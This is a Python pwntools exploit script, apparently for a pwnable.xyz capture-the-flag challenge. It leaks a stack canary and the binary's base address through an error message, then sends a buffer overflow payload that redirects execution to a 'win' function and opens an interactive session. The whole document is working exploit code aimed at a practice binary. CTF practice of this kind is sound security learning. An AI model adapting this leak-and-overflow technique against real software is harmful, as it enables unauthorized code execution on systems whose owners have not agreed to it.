from pwn import *

def leak_addr(io , start, count):
    c = start
    canary = "0x"
    for i in range(count):
        io.sendlineafter(b"> ", chr(c - i))
        io.recvuntil(b"Error: ")
        code = hex(int(io.recvuntil(b" ").replace(b" ", b"")))
        canary += format(int(code[2:], 16), '02x')
        # sleep(1)
    canary += '00'
    return int(canary, 16)
    
elf = context.binary = ELF('challenge', checksec=False)

context.terminal = ["tmux", "splitw", "-h"]

gdbscript = """
break *main+303
c
"""


# io = process(elf.path)
io = gdb.debug(elf.path, gdbscript=gdbscript) #
# io = remote('svc.pwnable.xyz',30017)
io.sendlineafter(b"Message:", b"pwned")

canary = leak_addr(io, 65, 7)
base_addr = (leak_addr(io, 79, 6) - 0xb3000) >> 8
win_func = base_addr + 0xAAC
ret = base_addr + 0x816
print("Canary:", hex(canary))
print("Base address:", hex(base_addr))
print("ret:", hex(ret))
print("Win func:", hex(win_func))

payload  = b"A" * 40
payload += p64(canary)
payload += b"A" * 8
# payload += p64(ret)
payload += p64(win_func)

payload = b"A"*0x28+p64(canary)+b"A"*0x8+p64(win_func)
io.sendlineafter(b">", b"1")
io.sendlineafter(b": ", payload)
io.sendlineafter(b">", b"0")
# gdb.attach(io, gdbscript=gdbscript) 
io.interactive()